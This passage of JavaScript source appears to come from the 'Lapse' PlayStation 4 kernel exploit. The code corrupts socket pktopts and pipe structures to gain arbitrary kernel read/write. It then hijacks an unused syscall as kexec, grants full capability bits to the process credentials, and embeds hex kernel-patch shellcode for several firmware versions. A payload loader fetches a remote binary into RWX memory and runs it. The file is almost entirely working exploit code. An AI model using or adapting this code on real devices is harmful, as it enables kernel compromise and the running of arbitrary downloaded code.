  //log(`proc.p_fd: ${p_fd}`);
  // curthread->td_proc->p_fd->fd_ofiles
  const ofiles = kread64(p_fd);
  //log(`ofiles: ${ofiles}`);
  const off_p_ucred = 0x40;
  const p_ucred = kread64(proc.add(off_p_ucred));
  //log(`p_ucred ${p_ucred}`);
  const pipes = new View4(2);
  sysi('pipe', pipes.addr);
  const pipe_file = kread64(ofiles.add(pipes[0] * 8));
  //log(`pipe file: ${pipe_file}`);
  // ofiles[pipe_fd].f_data
  const kpipe = kread64(pipe_file);
  //log(`pipe pointer: ${kpipe}`);
  const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
  for (var off = 0; off < pipe_save.size; off += 8) {
    pipe_save.write64(off, kread64(kpipe.add(off)));
  }
  const main_sd = psd;
  const worker_sd = dirty_sd;
  const main_file = kread64(ofiles.add(main_sd * 8));
  //log(`main sock file: ${main_file}`);
  // ofiles[sd].f_data
  const main_sock = kread64(main_file);
  //log(`main sock pointer: ${main_sock}`);
  // socket.so_pcb (struct inpcb *)
  const m_pcb = kread64(main_sock.add(0x18));
  //log(`main sock pcb: ${m_pcb}`);
  // inpcb.in6p_outputopts
  const m_pktopts = kread64(m_pcb.add(0x118));
  //log(`main pktopts: ${m_pktopts}`);
  //log(`0x100 malloc zone pointer: ${k100_addr}`);
  if (m_pktopts.ne(k100_addr)) {
    die('main pktopts pointer != leaked pktopts pointer');
  }
  // ofiles[sd].f_data
  const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
  //log(`reclaim sock pointer: ${reclaim_sock}`);
  // socket.so_pcb (struct inpcb *)
  const r_pcb = kread64(reclaim_sock.add(0x18));
  //log(`reclaim sock pcb: ${r_pcb}`);
  // inpcb.in6p_outputopts
  const r_pktopts = kread64(r_pcb.add(0x118));
  //log(`reclaim pktopts: ${r_pktopts}`);
  // ofiles[sd].f_data
  const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
  //log(`worker sock pointer: ${worker_sock}`);
  // socket.so_pcb (struct inpcb *)
  const w_pcb = kread64(worker_sock.add(0x18));
  //log(`worker sock pcb: ${w_pcb}`);
  // inpcb.in6p_outputopts
  const w_pktopts = kread64(w_pcb.add(0x118));
  //log(`worker pktopts: ${w_pktopts}`);
  // get restricted read/write with pktopts pair
  // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
  const w_pktinfo = w_pktopts.add(0x10);
  pktinfo.write64(0, w_pktinfo);
  pktinfo.write64(8, 0); // clear .ip6po_nexthop
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  pktinfo.write64(0, kernel_addr);
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  const kstr2 = jstr(pktinfo);
  //log(`*(&"evf cv"): ${kstr2}`);
  if (kstr2 !== 'evf cv') {
    die('pktopts read failed');
  }
  //log('achieved restricted kernel read/write');
  // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
  // using pktopts write. we can safely modify a pipe even with this limit so
  // we corrupt that instead for arbitrary read/write. pipe.pipe_map will be
  // clobbered with zeros but that's okay
  class KernelMemory {
    constructor(main_sd, worker_sd, pipes, pipe_addr) {
      this.main_sd = main_sd;
      this.worker_sd = worker_sd;
      this.rpipe = pipes[0];
      this.wpipe = pipes[1];
      this.pipe_addr = pipe_addr; // &pipe.pipe_buf
      this.pipe_addr2 = pipe_addr.add(0x10); // &pipe.pipe_buf.buffer
      this.rw_buf = new Buffer(0x14);
      this.addr_buf = new Buffer(0x14);
      this.data_buf = new Buffer(0x14);
      this.data_buf.write32(0xc, 0x40000000);
    }
    _verify_len(len) {
      if ((typeof len !== 'number') || !isFinite(len) || (Math.floor(len) !== len) || (len < 0) || (len > 0xffffffff)) {
        throw TypeError('len not a 32-bit unsigned integer');
      }
    }
    copyin(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;
      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write64(0, 0);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, dst);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi('write', this.wpipe, src, len);
    }
    copyout(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;
      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write32(0, 0x40000000);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, src);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi('read', this.rpipe, dst, len);
    }
    _read(addr) {
      const buf = this.rw_buf;
      buf.write64(0, addr);
      buf.fill(0, 8);
      ssockopt(this.main_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
      gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
    }
    read8(addr) {
      this._read(addr);
      return this.rw_buf.read8(0);
    }
    read16(addr) {
      this._read(addr);
      return this.rw_buf.read16(0);
    }
    read32(addr) {
      this._read(addr);
      return this.rw_buf.read32(0);
    }
    read64(addr) {
      this._read(addr);
      return this.rw_buf.read64(0);
    }
    write8(addr, value) {
      this.rw_buf.write8(0, value);
      this.copyin(this.rw_buf.addr, addr, 1);
    }
    write16(addr, value) {
      this.rw_buf.write16(0, value);
      this.copyin(this.rw_buf.addr, addr, 2);
    }
    write32(addr, value) {
      this.rw_buf.write32(0, value);
      this.copyin(this.rw_buf.addr, addr, 4);
    }
    write64(addr, value) {
      this.rw_buf.write64(0, value);
      this.copyin(this.rw_buf.addr, addr, 8);
    }
  }
  const kmem = new KernelMemory(main_sd, worker_sd, pipes, kpipe);
  const kstr3_buf = new Buffer(8);
  kmem.copyout(kernel_addr, kstr3_buf.addr, kstr3_buf.size);
  const kstr3 = jstr(kstr3_buf);
  //log(`*(&"evf cv"): ${kstr3}`);
  if (kstr3 !== 'evf cv') {
    die('pipe read failed');
  }
  //log('achieved arbitrary kernel read/write');
  // RESTORE: clean corrupt pointer
  // pktopts.ip6po_rthdr = NULL
  // ABC Patch
  const off_ip6po_rthdr = 0x68;
  const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
  const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
  kmem.write64(r_rthdr_p, 0);
  kmem.write64(w_rthdr_p, 0);
  //log('corrupt pointers cleaned');
  /*
  // REMOVE once restore kernel is ready for production
  // increase the ref counts to prevent deallocation
  kmem.write32(main_sock, kmem.read32(main_sock) + 1);
  kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
  // +2 since we have to take into account the fget_write()'s reference
  kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
  */
  return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
}
//================================================================================================
// GET PATCHES ===================================================================================
//================================================================================================
async function get_patches(url) {
  const response = await fetch(url);
  if (!response.ok) {
    throw Error(`Network response was not OK, status: ${response.status}\n` + `failed to fetch: ${url}`);
  }
  return response.arrayBuffer();
}
// Convert kpatch hex string to byte array
function hex2uint8(hex) {
  const len = hex.length >> 1;
  const out = new Uint8Array(len);
  for (var i = 0, j = 0; i < len; i++, j += 2) {
    const a = hex.charCodeAt(j);
    const b = hex.charCodeAt(j + 1);
    out[i] = (((a <= 57) ? (a - 48) : (a - 87)) << 4) | ((b <= 57) ? (b - 48) : (b - 87));
  }
  return out;
}
//================================================================================================
// STAGE KERNEL PATCH ============================================================================
//================================================================================================
// Using JIT to load our own shellcode code here avoids the need to preform
// some trick toggle the CR0.WP bit. We can just toggle it easily within our
// shellcode.
async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
  if (!is_ps4) {
    throw RangeError('PS5 kernel patching unsupported');
  }
  if ((config_target < 0x600) || (config_target >= 0x1000)) {
    throw RangeError('kernel patching unsupported');
  }
  //log('change sys_aio_submit() to sys_kexec()');
  // sysent[661] is unimplemented so free for use
  const sysent_661 = kbase.add(off_sysent_661);
  //const sy_narg = kmem.read32(sysent_661);
  //const sy_call = kmem.read64(sysent_661.add(8));
  //const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
  // Save tweaks from Al-Azif's source
  const sysent_661_save = new Buffer(0x30); // sizeof syscall
  for (var off = 0; off < sysent_661_save.size; off += 8) {
    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
  }
  //log(`sysent[611] save addr: ${sysent_661_save.addr}`);
  //log("sysent[611] save data:");
  //hexdump(sysent_661_save);
  // .sy_narg = 6
  kmem.write32(sysent_661, 6);
  // .sy_call = gadgets['jmp qword ptr [rsi]']
  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
  // .sy_thrcnt = SY_THR_STATIC
  kmem.write32(sysent_661.add(0x2c), 1);
  //log('set the bits for JIT privs');
  // cr_sceCaps[0] // 0x2000038000000000
  kmem.write64(p_ucred.add(0x60), -1);
  // cr_sceCaps[1] // 0x800000000000ff00
  kmem.write64(p_ucred.add(0x68), -1);
  var kpatch_bin;
  switch (config_target) {
    case 0x700:
    case 0x701:
    case 0x702:
      const kpatch0700_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b890e9ffff41b9eb000000668981ceac6300b890e9ffff41baeb00000041bbeb040000668981c14e09004881c2d2af0600b890e9ffffc681cd0a0000ebc6818def0200ebc681d1ef0200ebc6814df00200ebc68191f00200ebc6813df20200ebc681edf60200ebc681bdf70200eb6689b1efb56300c781900400000000000066448981c604000066448989bd04000066448991b9040000c681777b0800eb66448999084c26006689817b540900c781202c2f004831c0c3c68136231d0037c68139231d0037c781705812010200000048899178581201c7819c581201010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb070000c681b11b4a00eb668981ee1b4a0048b84183bfa004000000488981f71b4a00b8498bffffc681ff1b4a0090c681081c4a0087c681151c4a00b7c6812d1c4a0087c6813a1c4a00b7c681521c4a00bfc6815e1c4a00bfc6816a1c4a00bfc681761c4a00bf668981851c4a00c681871c4a00ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b1048899150d21201488b500848899158d21201488b501048899160d21201488b501848899168d21201488b502048899170d21201488b402848898178d2120131c0c34c8d40184829c2660f1f8400000000000fb630408834024883c0014939c075f0eb80";
      kpatch_bin = hex2uint8(kpatch0700_bin);
      break;
    case 0x750:
    case 0x751:
    case 0x755:
      const kpatch0750_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b890e9ffff41b9eb00000066898194736300b890e9ffff41baeb00000041bbeb040000668981041e45004881c282f60100b890e9ffffc681dd0a0000ebc6814df72800ebc68191f72800ebc6810df82800ebc68151f82800ebc681fdf92800ebc681adfe2800ebc6817dff2800eb6689b1cf7c6300c781900400000000000066448981c604000066448989bd04000066448991b9040000c68127a33700eb66448999c8143000668981c4234500c781309a02004831c0c3c6817db10d0037c68180b10d0037c781502512010200000048899158251201c7817c251201010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb030000ba050000004531c04531c9668981f5200b00be0500000048b84183bea00400000041ba01000000488981fa200b00b80400000041bb010000006689810c210b00b80400000066898119210b00b84c89ffffc78103220b00e9f2feffc68107220b00ffc78108210b00498b86d0c6810e210b0000c78115210b00498bb6b0c6811b210b0000c7812d210b00498b864066899131210b00c68133210b0000c7813a210b00498bb6206689b13e210b00c68140210b0000c78152210b00498dbec06644898156210b00c68158210b0000c7815e210b00498dbee06644898962210b00c68164210b0000c78171210b00498dbe006644899175210b00c68177210b0000c7817d210b00498dbe206644899981210b00c68183210b00006689818e210b00c68190210b00f70f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991309f1201488b5008488991389f1201488b5010488991409f1201488b5018488991489f1201488b5020488991509f1201488b4028488981589f120131c0c34c8d40184829c20f1f40000fb630408834024883c0014939c075f0eb85";
      kpatch_bin = hex2uint8(kpatch0750_bin);
      break;
    case 0x800:
    case 0x801:
    case 0x803:
      const kpatch0800_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c2dc600e0066898154d26200c681cd0a0000ebc6810de12500ebc68151e12500ebc681cde12500ebc68111e22500ebc681bde32500ebc6816de82500ebc6813de92500eb6689b13fdb6200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c68196d63400eb664489918bc63e0066448999848d3100c6813f953100ebc781c05109004831c0c3c6813ad00f0037c6813dd00f0037c781e0c60f0102000000488991e8c60f01c7810cc70f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c066898141f10900b8eb06000041b90100000041ba0100000066898183f1090041bb498bffff48b84183bfa0040000004889818bf10900b8040000006689819df10900b804000000668981aaf10900b805000000c78199f10900498b87d0c6819ff1090000c781a6f10900498bb7b0c681acf1090000c781bef10900498b8740668981c2f10900c681c4f1090000c781cbf10900498bb720668991cff10900c681d1f1090000c781e3f10900498dbfc06689b1e7f10900c681e9f1090000c781eff10900498dbfe066448981f3f10900c681f5f1090000c78102f20900498dbf006644898906f20900c68108f2090000c7810ef20900498dbf206644899112f20900c68114f2090000664489991ff20900c68121f20900ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991c0401001488b5008488991c8401001488b5010488991d0401001488b5018488991d8401001488b5020488991e0401001488b4028488981e840100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0800_bin);
      break;
    case 0x850:
    case 0x852:
      const kpatch0850_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c24d7f0c0066898174466200c681cd0a0000ebc6813d403a00ebc68181403a00ebc681fd403a00ebc68141413a00ebc681ed423a00ebc6819d473a00ebc6816d483a00eb6689b15f4f6200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c681d6f32200eb66448991dbd614006644899974740100c6812f7c0100ebc78140d03a004831c0c3c681ea26080037c681ed26080037c781d0c70f0102000000488991d8c70f01c781fcc70f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c066898121020300b8eb06000041b90100000041ba010000006689816302030041bb498bffff48b84183bfa0040000004889816b020300b8040000006689817d020300b8040000006689818a020300b805000000c78179020300498b87d0c6817f02030000c78186020300498bb7b0c6818c02030000c7819e020300498b8740668981a2020300c681a402030000c781ab020300498bb720668991af020300c681b102030000c781c3020300498dbfc06689b1c7020300c681c902030000c781cf020300498dbfe066448981d3020300c681d502030000c781e2020300498dbf0066448989e6020300c681e802030000c781ee020300498dbf2066448991f2020300c681f40203000066448999ff020300c68101030300ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991b0411001488b5008488991b8411001488b5010488991c0411001488b5018488991c8411001488b5020488991d0411001488b4028488981d841100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0850_bin);
      break;
    case 0x900:
      const kpatch0900_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c681061a0000eb664489918b0b080066448999c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c0668981015a4100b8eb06000041b90100000041ba01000000668981435a410041bb498bffff48b84183bfa0040000004889814b5a4100b8040000006689815d5a4100b8040000006689816a5a4100b805000000c781595a4100498b87d0c6815f5a410000c781665a4100498bb7b0c6816c5a410000c7817e5a4100498b8740668981825a4100c681845a410000c7818b5a4100498bb7206689918f5a4100c681915a410000c781a35a4100498dbfc06689b1a75a4100c681a95a410000c781af5a4100498dbfe066448981b35a4100c681b55a410000c781c25a4100498dbf0066448989c65a4100c681c85a410000c781ce5a4100498dbf2066448991d25a4100c681d45a41000066448999df5a4100c681e15a4100ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991007f1001488b5008488991087f1001488b5010488991107f1001488b5018488991187f1001488b5020488991207f1001488b4028488981287f100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0900_bin);
      break;
    case 0x903:
    case 0x904:
      const kpatch0903_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c681061a0000eb664489918b0b08006644899994ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c066898171394100b8eb06000041b90100000041ba01000000668981b339410041bb498bffff48b84183bfa004000000488981bb394100b804000000668981cd394100b804000000668981da394100b805000000c781c9394100498b87d0c681cf39410000c781d6394100498bb7b0c681dc39410000c781ee394100498b8740668981f2394100c681f439410000c781fb394100498bb720668991ff394100c681013a410000c781133a4100498dbfc06689b1173a4100c681193a410000c7811f3a4100498dbfe066448981233a4100c681253a410000c781323a4100498dbf0066448989363a4100c681383a410000c7813e3a4100498dbf2066448991423a4100c681443a410000664489994f3a4100c681513a4100ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991003f1001488b5008488991083f1001488b5010488991103f1001488b5018488991183f1001488b5020488991203f1001488b4028488981283f100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0903_bin);
      break;
    case 0x950:
    case 0x951:
    case 0x960:
      const kpatch0950_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c68136a51f00eb664489913b6d19006644899924f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c066898171770d00b8eb06000041b90100000041ba01000000668981b3770d0041bb498bffff48b84183bfa004000000488981bb770d00b804000000668981cd770d00b804000000668981da770d00b805000000c781c9770d00498b87d0c681cf770d0000c781d6770d00498bb7b0c681dc770d0000c781ee770d00498b8740668981f2770d00c681f4770d0000c781fb770d00498bb720668991ff770d00c68101780d0000c78113780d00498dbfc06689b117780d00c68119780d0000c7811f780d00498dbfe06644898123780d00c68125780d0000c78132780d00498dbf006644898936780d00c68138780d0000c7813e780d00498dbf206644899142780d00c68144780d0000664489994f780d00c68151780d00ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991e00e1001488b5008488991e80e1001488b5010488991f00e1001488b5018488991f80e1001488b5020488991000f1001488b4028488981080f100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0950_bin);
      break;
    default:
      die('kpatch_bin file not found');
      break;
  }
//  const buf = await get_patches(patch_elf_loc);
  var buf = kpatch_bin.buffer;
  // FIXME handle .bss segment properly
  // assume start of loadable segments is at offset 0x1000
  const patches = new View1(buf);
  var map_size = patches.size;
  const max_size = 0x10000000;
  if (map_size > max_size) {
    die(`patch file too large (>${max_size}): ${map_size}`);
  }
  if (map_size === 0) {
    die('patch file size is zero');
  }
  //log(`kpatch size: ${map_size} bytes`);
  map_size = (map_size + page_size) & -page_size;
  const prot_rwx = 7;
  const prot_rx = 5;
  const prot_rw = 3;
  const exec_p = new Int(0, 9);
  const write_p = new Int(max_size, 9);
  //log('open JIT fds');
  const exec_fd = sysi('jitshm_create', 0, map_size, prot_rwx);
  //const write_fd = sysi('jitshm_alias', exec_fd, prot_rw);
  //log('mmap for kpatch shellcode');
  const exec_addr = chain.sysp(
    'mmap',
    exec_p,
    map_size,
    prot_rx,
    MAP_SHARED | MAP_FIXED,
    exec_fd,
    0
  );
  const write_addr = chain.sysp(
    'mmap',
    write_p,
    map_size,
    prot_rw,
    MAP_SHARED | MAP_FIXED,
    exec_fd,
    0
  );
  //log(`exec_addr: ${exec_addr}`);
  //log(`write_addr: ${write_addr}`);
  if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
    die('mmap() for jit failed');
  }
  //log('mlock exec_addr for kernel exec');
  sysi('mlock', exec_addr, map_size);
  // mov eax, 0x1337; ret (0xc300_0013_37b8)
  const test_code = new Int(0x001337b8, 0xc300);
  write_addr.write64(0, test_code);
  //log('test jit exec');
  sys_void('kexec', exec_addr);
  var retval = chain.errno;
  //log('returned successfully');
  //log(`jit retval: ${retval}`);
  if (retval !== 0x1337) {
    die('test jit exec failed');
  }
  const pipe_save = restore_info[1];
  restore_info[1] = pipe_save.addr;
  //log('mlock pipe save data for kernel restore');
  sysi('mlock', restore_info[1], page_size);
  // Restore tweaks from Al-Azif's source
  restore_info[4] = sysent_661_save.addr;
  //log('mlock sysent_661 save data for kernel restore');
  sysi('mlock', restore_info[4], page_size);
  //log('execute kpatch...');
  mem.cpy(write_addr, patches.addr, patches.size);
  sys_void('kexec', exec_addr, ...restore_info);
  //log('setuid(0)');
  //sysi('setuid', 0);
  //log('kernel exploit succeeded!');
  //log('restore sys_aio_submit()');
  //kmem.write32(sysent_661, sy_narg);
  // .sy_call = gadgets['jmp qword ptr [rsi]']
  //kmem.write64(sysent_661.add(8), sy_call);
  // .sy_thrcnt = SY_THR_STATIC
  //kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
}
//================================================================================================
// Create 32-bit Array from Address ==============================================================
//================================================================================================
// This function creates a "fake" Uint32Array that is backed by an
// arbitrary memory address 'addr' instead of its own data buffer.
function array_from_address(addr, size) {
  // 1. Create a normal, "original" (og) Uint32Array.
  //    Its actual contents don't matter.
  var og_array = new Uint32Array(0x1000);
  // 2. Get the memory address OF the 'og_array' JavaScript object itself.
  //    Then, add 0x10 (16 bytes) to it. This offset points to the
  //    internal metadata of the array, specifically where its
  //    "data pointer" (ArrayBufferView's 'data' field) is stored.
  var og_array_i = mem.addrof(og_array).add(0x10);
  // 3. --- This is the core of the exploit ---
  //    Overwrite the internal "data pointer" of 'og_array'.
  //    Instead of pointing to its own allocated buffer, make it point
  //    to the 'addr' that was passed into the function.
  mem.write64(og_array_i, addr);
  // 4. Overwrite the internal "length" property of 'og_array'.
  //    The array will now believe it has 'size' elements.
  //    (This offset, 0x8 bytes from the data pointer, is typical).
  mem.write32(og_array_i.add(0x8), size);
  // 5. Overwrite another internal field (likely capacity or a flag) to
  //    ensure the array is considered valid.
  mem.write32(og_array_i.add(0xc), 1);
  // 6. Push the 'og_array' to a special list (nogc = no garbage collection).
  //    This prevents the JavaScript engine from trying to "clean up"
  //    this corrupted object, which would likely cause a crash.
  nogc.push(og_array);
  // 7. Return the modified 'og_array'.
  //    Anyone using this array (e.g., `returned_array[0] = 0x...`)
  //    is NOT writing to a safe JavaScript buffer.
  //    They are writing directly to memory at 'addr'.
  return og_array;
}
//================================================================================================
// Payload Loader ================================================================================
//================================================================================================
// Allocate a small memory region (0x1000 bytes) using a system call (mmap).
// The flags 'PROT_READ | PROT_WRITE | PROT_EXEC' (RWX) are critical.
// This makes the memory Readable, Writable, and EXECUTABLE.
// This is a dangerous practice and is blocked by security measures in normal environments.
async function PayloadLoader(Pfile) {
  try {
    /*
    // Fetch the payload from payload.js
    var PLD = hex2uint8(payload_bin);
    // Calculate required padding to ensure the data length is a multiple of 4 bytes.
    // This is necessary because we will use Uint32Array (4 bytes per element) later.
    const originalLength = PLD.length;
    const paddingLength = (4 - (originalLength & 3)) & 3;
    // Create a new Uint8Array with the aligned size (original + padding)
    const paddedBuffer = new Uint8Array(originalLength + paddingLength);
    // Copy the original payload data into the new buffer
    paddedBuffer.set(PLD, 0);
    */
    // Fetch the payload file (e.g., payload.bin) from the server
    const response = await fetch(Pfile);
    if (!response.ok) {
      throw new Error(`Payload ${Pfile} file read error: ${response.status}`);
    }
    var PLD = await response.arrayBuffer(); // Read the downloaded payload as an ArrayBuffer.
    // Calculate required padding to ensure the data length is a multiple of 4 bytes.
    // This is necessary because we will use Uint32Array (4 bytes per element) later.
    const originalLength = PLD.byteLength;
    const paddingLength = (4 - (originalLength & 3)) & 3;
    // Create a new Uint8Array with the aligned size (original + padding)
    const paddedBuffer = new Uint8Array(originalLength + paddingLength);
    // Copy the original payload data into the new buffer
    paddedBuffer.set(new Uint8Array(PLD), 0);
    // If padding is needed, fill the remaining space with zeros
    if (paddingLength) paddedBuffer.set(new Uint8Array(paddingLength), originalLength);

    // Create a 32-bit integer view of the aligned payload buffer for copying
    const shellcode = new Uint32Array(paddedBuffer.buffer);
    // Allocate Executable, Writable, and Readable (RWX) memory using mmap system call.
    // 0x41000 = MAP_ANON | MAP_PRIVATE (Anonymous memory mapping)
    const payload_buffer = chain.sysp('mmap', 0, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
    // Create a custom JavaScript array view that points directly to the allocated native memory address
    const native_view = array_from_address(payload_buffer, shellcode.length);
    // Write the payload (shellcode) into the allocated executable memory
    native_view.set(shellcode);
    // Ensure the memory permissions are strictly set to RWX (Read/Write/Execute)
    chain.sys('mprotect', payload_buffer, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC);
    // Prepare the pthread structure and context for thread creation
    const ctx = new Buffer(0x10);
    const pthread = new Pointer();
    pthread.ctx = ctx;
    // Execute the payload by creating a new thread starting at the payload's memory address
    call_nze('pthread_create', pthread.addr, 0, payload_buffer, 0);
  } catch (e) {
    //log(`PayloadLoader error: ${e}`);
    return 0;
  }
  return 1;
}
//================================================================================================
// Cleanup Function ==============================================================================
//================================================================================================
var block_fd, unblock_fd, current_core, current_rtprio, current_core_stored;
var sds, block_id, groom_ids, pktopts_sds, dirty_sd, sd_pair_main;
//================================================================================================
function doCleanup() {
  if (unblock_fd !== -1) {
    try {
      close(unblock_fd);
    } catch (e) {}
    unblock_fd = -1;
  }
  if (block_fd !== -1) {
    try {
      close(block_fd);
    } catch (e) {}
    block_fd = -1;
  }
  if (groom_ids !== null) {
    try {
      free_aios2(groom_ids.addr, groom_ids.length);
    } catch (e) {}
    groom_ids = null;
  }
  if (block_id !== 0xffffffff) {
    try {
      aio_multi_wait(block_id.addr, 1);
    } catch(e) {}
    try {
      aio_multi_delete(block_id.addr, block_id.length);
    } catch(e) {}
    block_id = 0xffffffff;
  }
  if (sds !== null) {
    for (const sd of sds) {
      try {
        close(sd);
      } catch(e) {}
    }
    sds = null;
  }
  if (pktopts_sds !== null) {
    for (const psd of pktopts_sds) {
      try {
        close(psd);
      } catch(e) {}
    }
  }
//  if (sd_pair_main !== null) {
//    try {
//      close(sd_pair_main[0]);
//    } catch(e) {}
//    try {
//      close(sd_pair_main[1]);
//    } catch(e) {}
//    sd_pair_main = null;
//  }
}
//================================================================================================
// Lapse Exploit Function ========================================================================
//================================================================================================
async function doLapseExploit() {
  // overview:
  // * double free a aio_entry (resides at a 0x80 malloc zone)
  // * type confuse a evf and a ip6_rthdr
  // * use evf/rthdr to read out the contents of the 0x80 malloc zone
  // * leak a address in the 0x100 malloc zone
  // * write the leaked address to a aio_entry
  // * double free the leaked address
  // * corrupt a ip6_pktopts for restricted r/w
  // * corrupt a pipe for arbitrary r/w
  //
  // the exploit implementation also assumes that we are pinned to one core
  current_core_stored = 0;
